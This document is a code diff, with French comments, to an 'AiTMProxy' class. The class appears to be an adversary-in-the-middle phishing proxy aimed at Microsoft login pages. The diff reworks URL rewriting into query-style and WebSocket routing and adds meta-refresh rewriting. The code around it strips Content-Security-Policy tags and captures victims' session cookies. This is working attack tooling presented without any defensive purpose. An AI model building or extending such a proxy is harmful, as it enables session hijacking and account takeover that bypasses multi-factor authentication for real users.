@@ -7,7 +7,7 @@ import json
 from http.cookies import SimpleCookie
 from typing import Dict, Optional, Tuple, List, Any
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
+from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, quote
 from fastapi import Request, Response, HTTPException, WebSocket
 from starlette.websockets import WebSocketDisconnect
 from core.session.session_manager import session_manager
@@ -154,7 +154,7 @@ class AiTMProxy:
             print(f"[WS Rewrite Error] {e}")
             return text
 
-    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None, proxy_base_path: str = "") -> Response:
+    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None, proxy_base_path: str = "/v5/proxy") -> Response:
         """
         Proxy la requête vers le serveur cible et réécrit la réponse.
         """
@@ -405,10 +405,10 @@ class AiTMProxy:
              if parsed_cookies:
                  self.session_manager.capture_cookies(session_id, parsed_cookies)
 
-    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str) -> str:
+    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str = "") -> str:
         """
         Réécrit une URL absolue pour qu'elle passe par le proxy.
-        Ex: https://login.microsoft.com/common/oauth2 -> /v5/proxy/https://login.microsoft.com/common/oauth2
+        Ex: https://login.microsoft.com/common/oauth2 -> /v5/proxy?url=https%3A%2F%2Flogin.microsoft.com%2Fcommon%2Foauth2
         """
         if not url:
             return url
@@ -417,24 +417,60 @@ class AiTMProxy:
         if url.startswith(("data:", "blob:", "mailto:", "javascript:", "#")):
             return url
             
-        # Handle relative URLs
+        # Handle root-relative URLs
         if url.startswith("/"):
             parsed_base = urlparse(base_url)
             full_upstream_url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
-            return f"{proxy_base_path}/{full_upstream_url}"
+            # If using /v5/p/<sid>, join path style
+            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
+                return f"{proxy_base_path}{url}"
+            if proxy_base_path == "/v5/proxy":
+                from urllib.parse import quote
+                return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
+            # Default: path-only
+            return url
             
         # Handle absolute URLs
-        if url.startswith(("http://", "https://")):
+        if url.startswith(("http://", "https://", "ws://", "wss://")):
             # If it's already pointing to our proxy, leave it
             if self.proxy_domain in url:
                 return url
-                
-            # Rewrite to proxy
-            return f"{proxy_base_path}/{url}"
-            
-        return url
+            # If using /v5/p/<sid>, append path component only
+            parsed = urlparse(url)
+            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
+                # Keep only the path (and optionally query if present)
+                path = parsed.path or ""
+                if parsed.query:
+                    # If queries exist, fall back to query-style to preserve semantics
+                    from urllib.parse import quote
+                    encoded = quote(url, safe='/?&=')
+                    return f"{proxy_base_path}?url={encoded}"
+                return f"{proxy_base_path}{path}"
+            # Otherwise, use /v5/proxy with query parameter if specified
+            is_ws = url.startswith(("ws://", "wss://"))
+            endpoint = "/ws" if is_ws else ""
+            if proxy_base_path == "/v5/proxy":
+                from urllib.parse import quote
+                encoded = quote(url, safe='/?&=')
+                return f"{proxy_base_path}{endpoint}?url={encoded}"
+            # Default: path-only
+            return parsed.path or url
+        
+        # Handle relative non-root URLs (e.g., "socket")
+        try:
+            full_upstream_url = urljoin(base_url, url)
+            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
+                parsed = urlparse(full_upstream_url)
+                return f"{proxy_base_path}{parsed.path}"
+            if proxy_base_path == "/v5/proxy":
+                return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
+            # Default path-only
+            parsed = urlparse(full_upstream_url)
+            return parsed.path or url
+        except Exception:
+            return url
 
-    def rewrite_html(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+    def rewrite_html(self, content: bytes, base_url: str, proxy_base_path: str = "/v5/proxy") -> bytes:
         """
         Parse et réécrit les liens dans le HTML (href, src, action).
         """
@@ -478,12 +514,27 @@ class AiTMProxy:
             for meta in soup.find_all('meta', attrs={"http-equiv": lambda x: x and x.lower() == 'content-security-policy'}):
                 meta.decompose()
 
+            # Rewrite meta refresh URLs if present
+            for meta in soup.find_all('meta', attrs={"http-equiv": lambda x: x and x.lower() == 'refresh'}):
+                content_attr = meta.get("content")
+                if content_attr and "url=" in content_attr.lower():
+                    try:
+                        parts = content_attr.split(";", 1)
+                        prefix = parts[0]
+                        url_part = parts[1] if len(parts) > 1 else ""
+                        if "url=" in url_part.lower():
+                            key, val = url_part.split("=", 1)
+                            rewritten = self._rewrite_url(val.strip(), base_url, proxy_base_path)
+                            meta["content"] = f"{prefix}; url={rewritten}"
+                    except Exception:
+                        pass
+
             return str(soup).encode('utf-8')
         except Exception as e:
             print(f"[AiTM Warning] HTML rewrite failed: {e}")
             return content
 
-    def rewrite_css(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+    def rewrite_css(self, content: bytes, base_url: str, proxy_base_path: str = "/v5/proxy") -> bytes:
         """
         Réécrit les URLs dans les fichiers CSS (url(), @import).
         """
@@ -514,7 +565,7 @@ class AiTMProxy:
         except:
             return content
 
-    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "/v5/proxy") -> bytes:
         """
         Réécrit les URLs dans une réponse JSON.
         """
@@ -525,20 +576,20 @@ class AiTMProxy:
         except:
             return content
 
-    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str = "/v5/proxy") -> bytes:
         """
         Réécrit les URLs dans les fichiers JS (Regex simple).
         """
         try:
             text = content.decode('utf-8')
             
-            # Regex pour trouver les URLs http/https
+            # Regex pour trouver les URLs http/https/ws/wss
             def replace(match):
                 url = match.group(0)
                 return self._rewrite_url(url, base_url, proxy_base_path)
                 
-            # Pattern amélioré pour JS
-            pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
+            # Pattern pour http/https/ws/wss
+            pattern = re.compile(r'(?:https?|wss?)://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
             rewritten_text = pattern.sub(replace, text)
             
             return rewritten_text.encode('utf-8')
